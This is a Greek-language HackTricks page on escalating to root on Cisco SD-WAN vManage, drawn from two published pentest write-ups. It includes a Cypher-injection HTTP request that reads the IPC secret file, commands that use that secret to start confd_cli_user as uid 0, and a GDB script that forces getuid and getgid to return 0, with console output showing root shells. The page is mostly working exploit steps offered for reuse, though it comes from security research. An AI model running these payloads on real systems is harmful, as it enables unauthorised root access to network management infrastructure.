# Cisco - vmanage

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** [**💬**](https://emojipedia.org/speech-balloon/) [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Διαδρομή 1

(Παράδειγμα από [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Αφού ψάξαμε λίγο μέσα από κάποια [τεκμηρίωση](http://66.218.245.39/doc/html/rn03re18.html) που σχετίζεται με το `confd` και τα διάφορα δυαδικά αρχεία (προσβάσιμα με έναν λογαριασμό στην ιστοσελίδα της Cisco), ανακαλύψαμε ότι για να πιστοποιήσει το IPC socket, χρησιμοποιεί ένα μυστικό που βρίσκεται στο `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Θυμάστε την περίπτωση της Neo4j; Εκτελείται με τα δικαιώματα του χρήστη `vmanage`, επιτρέποντάς μας να ανακτήσουμε το αρχείο χρησιμοποιώντας την προηγούμενη ευπάθεια:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Το πρόγραμμα `confd_cli` δεν υποστηρίζει παραμέτρους γραμμής εντολών, αλλά καλεί το `/usr/bin/confd_cli_user` με ορίσματα. Έτσι, μπορούμε να καλέσουμε απευθείας το `/usr/bin/confd_cli_user` με το δικό μας σύνολο ορισμάτων. Ωστόσο, δεν είναι αναγνώσιμο με τα τρέχοντα προνόμια μας, οπότε πρέπει να το ανακτήσουμε από το rootfs και να το αντιγράψουμε χρησιμοποιώντας το scp, να διαβάσουμε τη βοήθεια και να το χρησιμοποιήσουμε για να πάρουμε το κέλυφος:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Διαδρομή 2

(Παράδειγμα από [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Το blog¹ της ομάδας synacktiv περιγράφει έναν κομψό τρόπο για να αποκτήσετε ένα root shell, αλλά το πρόβλημα είναι ότι απαιτείται να αποκτήσετε ένα αντίγραφο του `/usr/bin/confd_cli_user` το οποίο είναι μόνο αναγνώσιμο από τον root. Βρήκα έναν άλλο τρόπο για να αναβαθμίσετε σε root χωρίς τέτοια ενόχληση.

Όταν αποσυναρμολόγησα το δυαδικό αρχείο `/usr/bin/confd_cli`, παρατήρησα τα εξής:
```
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
Όταν εκτελώ την εντολή "ps aux", παρατήρησα τα παρακάτω (_σημείωση -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Υπέθεσα ότι το πρόγραμμα "confd\_cli" περνάει το αναγνωριστικό χρήστη και την αναγνωριστική ομάδα που συλλέγει από τον συνδεδεμένο χρήστη στην εφαρμογή "cmdptywrapper".

Η πρώτη μου προσπάθεια ήταν να εκτελέσω απευθείας το "cmdptywrapper" και να του παρέχω τις παραμέτρους `-g 0 -u 0`, αλλά απέτυχε. Φαίνεται ότι δημιουργήθηκε ένας περιγραφέας αρχείου (-i 1015) κάπου κατά τη διάρκεια της διαδικασίας και δεν μπορώ να τον πλαστογραφήσω.

Όπως αναφέρεται στο ιστολόγιο της synacktiv (τελευταίο παράδειγμα), το πρόγραμμα `confd_cli` δεν υποστηρίζει παραμέτρους γραμμής εντολών, αλλά μπορώ να το επηρεάσω με έναν αποσφαλματωτή και ευτυχώς το GDB περιλαμβάνεται στο σύστημα.

Δημιούργησα ένα σενάριο GDB όπου ανάγκασα τις API `getuid` και `getgid` να επιστρέψουν 0. Εφόσον ήδη έχω τα δικαιώματα "vmanage" μέσω της ευπάθειας RCE της αποσειροποίησης, έχω άδεια να διαβάσω απευθείας το αρχείο `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Έξοδος κονσόλας:
```
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε τη **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στη **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
